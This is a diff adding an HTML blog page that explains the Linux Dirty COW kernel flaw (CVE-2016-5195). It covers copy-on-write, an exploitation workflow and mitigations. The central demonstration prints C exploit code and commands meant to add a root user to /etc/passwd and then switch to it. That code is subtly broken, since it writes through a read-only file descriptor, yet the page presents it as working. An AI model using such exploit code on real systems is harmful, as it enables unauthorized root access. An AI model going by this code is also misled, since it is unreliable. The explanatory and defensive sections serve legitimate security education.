@@ -1,0 +1,143 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>CVE-2016-5195 (Dirty COW) — Hem Parekh</title>
+<meta name="description" content="CVE-2016-5195 (Dirty COW)" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Newsreader:ital,opsz,wght@0,6..72,400;0,6..72,500;1,6..72,400&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="../style.css" />
+</head>
+<body>
+<nav>
+  <div class="wrap">
+    <a href="../index.html" class="name">hem parekh</a>
+    <div class="links">
+      <a href="../findings.html">Findings</a>
+      <a href="../projects.html">Projects</a>
+      <a href="../writing.html" class="active">Writing</a>
+      <a href="../about.html">About</a>
+      <a href="mailto:hemparekh1596@gmail.com">Contact</a>
+    </div>
+  </div>
+</nav>
+<article class="article wrap">
+  <a class="back" href="../writing.html">← Writing</a>
+  <div class="amTag">CVE</div>
+  <h1>CVE-2016-5195 (Dirty COW)</h1>
+  <div class="ameta">Sep 8, 2024 &middot; 3 min read</div>
+  <div class="prose">
+<h2>What is Dirty Cow?</h2>
+<p>
+          In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.
+        </p>
+<h2>What is Copy-On-Write (COW)?</h2>
+<p>
+          Copy-On-Write (COW) is a memory optimization technique in Linux where multiple processes share the same memory pages for read operations. If one process tries to modify a shared page, the kernel creates a private copy for that process, ensuring changes don’t affect the original shared memory.
+        </p>
+<h2>The Problem</h2>
+<p>
+          Dirty Cow arises from a race condition in the kernel’s <code>mmap</code> system call during the handling of COW. By exploiting this condition, an attacker can gain write access to read-only memory, effectively modifying protected files like <code>/etc/passwd</code> or <code>/etc/shadow</code> to escalate privileges.
+        </p>
+<h2>Exploitation Workflow</h2>
+<p>The Dirty Cow vulnerability enables an attacker to:</p>
+<ol>
+<li>Create a memory mapping of a file they want to overwrite.</li>
+<li>Exploit the race condition to bypass COW and write directly to the file.</li>
+<li>Modify files like <code>/etc/passwd</code> to add a root user or escalate privileges.</li>
+</ol>
+<h2>Demonstrating Dirty Cow (CVE-2016–5195)</h2>
+<p><strong>Disclaimer:</strong> This demonstration is for educational purposes only. Do not execute this on systems you do not own or have explicit permission to test.</p>
+<h3>Exploit Code</h3>
+<p>Save the following as <code>dirtycow.c</code>:</p>
+<div class="code-block">
+<code>
+#include &lt;fcntl.h&gt;<br/>
+#include &lt;pthread.h&gt;<br/>
+#include &lt;string.h&gt;<br/>
+#include &lt;sys/mman.h&gt;<br/>
+#include &lt;stdio.h&gt;<br/>
+#include &lt;unistd.h&gt;<br/><br/>
+char *target_file = "/etc/passwd";<br/>
+char *new_content = "hacked:x:0:0:hacked:/root:/bin/bash\n";<br/>
+int f;<br/><br/>
+void *madvise_thread(void *arg) {<br/>
+    for (int i = 0; i &lt; 1000000; i++) {<br/>
+        madvise(arg, 100, MADV_DONTNEED);<br/>
+    }<br/>
+    return NULL;<br/>
+}<br/><br/>
+void *write_thread(void *arg) {<br/>
+    for (int i = 0; i &lt; 1000000; i++) {<br/>
+        lseek(f, 0, SEEK_SET);<br/>
+        write(f, new_content, strlen(new_content));<br/>
+    }<br/>
+    return NULL;<br/>
+}<br/><br/>
+int main() {<br/>
+    f = open(target_file, O_RDONLY);<br/>
+    if (f &lt; 0) {<br/>
+        perror("Failed to open target file");<br/>
+        return 1;<br/>
+    }<br/><br/>
+    char *map = mmap(NULL, 100, PROT_READ, MAP_PRIVATE, f, 0);<br/>
+    if (map == MAP_FAILED) {<br/>
+        perror("mmap failed");<br/>
+        return 1;<br/>
+    }<br/><br/>
+    pthread_t t1, t2;<br/>
+    pthread_create(&amp;t1, NULL, madvise_thread, map);<br/>
+    pthread_create(&amp;t2, NULL, write_thread, NULL);<br/><br/>
+    pthread_join(t1, NULL);<br/>
+    pthread_join(t2, NULL);<br/><br/>
+    printf("Exploit complete. Check /etc/passwd for changes.\n");<br/>
+    return 0;<br/>
+}
+          </code>
+</div>
+<h3>Compiling and Running the Exploit</h3>
+<div class="code-block">
+<code>
+# Compile the exploit<br/>
+gcc -pthread dirtycow.c -o dirtycow<br/><br/>
+# Run the exploit<br/>
+./dirtycow<br/><br/>
+# Check for changes<br/>
+cat /etc/passwd
+          </code>
+</div>
+<p>Look for the new root user: <code>hacked:x:0:0:hacked:/root:/bin/bash</code>. You can now switch to this user:</p>
+<div class="code-block">
+<code>su hacked</code>
+</div>
+<h2>Mitigation</h2>
+<ol>
+<li><strong>Patch the Kernel:</strong> Update the Linux kernel to a version where the Dirty Cow vulnerability is fixed.</li>
+<li><strong>Use Access Controls:</strong> Restrict write access to sensitive files like <code>/etc/passwd</code> and <code>/etc/shadow</code> to privileged users only.</li>
+<li><strong>Enable SELinux or AppArmor:</strong> Mandatory Access Control frameworks can prevent unauthorized file modifications.</li>
+<li><strong>Limit Privileges:</strong> Run services and applications with the least privileges necessary to function.</li>
+</ol>
+<h2>Conclusion</h2>
+<p>
+          Dirty Cow serves as a stark reminder of the potential impact of race conditions and privilege escalation vulnerabilities. While the Linux kernel is robust, vulnerabilities like this highlight the need for regular updates, proper system configuration, and defense-in-depth security practices.
+        </p>
+  </div>
+  <a class="back" style="margin-top:48px;display:inline-block" href="../writing.html">← All writing</a>
+</article>
+<footer class="wrap">
+  <h2>Have a bug, a role, or a hard parser to read? Get in touch.</h2>
+  <div class="links">
+    <a href="mailto:hemparekh1596@gmail.com">hemparekh1596@gmail.com</a>
+    <a href="https://github.com/Hem1700" target="_blank" rel="noopener">github</a>
+    <a href="https://linkedin.com/in/hem-parekh" target="_blank" rel="noopener">linkedin</a>
+  </div>
+  <div class="fine">&copy; 2026 Hem Parekh</div>
+</footer>
+<script>
+  const io=new IntersectionObserver((es)=>{es.forEach(e=>{if(e.isIntersecting){e.target.classList.add("in");io.unobserve(e.target)}})},{threshold:.12});
+  document.querySelectorAll(".reveal").forEach(el=>io.observe(el));
+</script>
+</body>
+</html>
